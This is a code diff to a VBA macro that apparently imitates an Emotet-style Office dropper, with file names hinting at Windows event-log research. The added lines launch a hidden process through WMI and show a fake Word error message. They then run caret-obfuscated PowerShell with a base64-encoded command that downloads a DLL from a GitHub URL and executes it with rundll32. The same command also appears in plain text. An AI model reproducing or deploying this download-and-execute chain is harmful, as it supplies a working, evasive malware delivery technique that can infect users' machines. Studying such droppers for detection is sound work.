@@ -4,7 +4,9 @@ Set a = GetObject("winmgmts:Win32_ProcessStartup")
 Set config = a.SpawnInstance_
 config.ShowWindow = 12
 Set b = GetObject("winmgmts:Win32_Process")
-returnV = b.Create("powershell.exe   ""Get-Date > test.txt""", "C:\Users\Bastian.BACHELOR\Desktop", config, processID)
-'("powershell.exe   ""Get-Date > test.txt""",
+commandString = "$csi = New-Object System.Net.WebClient; $csi.Headers['User-Agent'] = 'Mozilla/5.0';$csi.DownloadFile('https://github.com/bobbybaer/WindowsEventLogs/raw/main/rundll32/emotetImitation.dll', ($env:USERPROFILE +'\Documents\emotetImitation1.dll')); rundll32.exe ($env:USERPROFILE +'\Documents\emotetImitation1.dll'), func;"
+commandStringB64 = "JABjAHMAaQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMAcwBpAC4ASABlAGEAZABlAHIAcwBbACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnAF0AIAA9ACAAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwA7ACQAYwBzAGkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBiAG8AYgBiAHkAYgBhAGUAcgAvAFcAaQBuAGQAbwB3AHMARQB2AGUAbgB0AEwAbwBnAHMALwByAGEAdwAvAG0AYQBpAG4ALwByAHUAbgBkAGwAbAAzADIALwBlAG0AbwB0AGUAdABJAG0AaQB0AGEAdABpAG8AbgAuAGQAbABsACcALAAgACgAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQAgACsAJwBcAEQAbwBjAHUAbQBlAG4AdABzAFwAZQBtAG8AdABlAHQASQBtAGkAdABhAHQAaQBvAG4AMQAuAGQAbABsACcAKQApADsAIAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAgACgAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQAgACsAJwBcAEQAbwBjAHUAbQBlAG4AdABzAFwAZQBtAG8AdABlAHQASQBtAGkAdABhAHQAaQBvAG4AMQAuAGQAbABsACcAKQAsACAAZgB1AG4AYwA7AA=="
+returnV = b.Create("cmd cmd cmd cmd  /c msg %username% /v Word experienced an error trying to open the file. & P^Ow^er^she^L^L -w hidden -encodedCommand " & commandStringB64, "C:\Users\Bastian.BACHELOR\Desktop", config, processID)
 
 End Sub
+
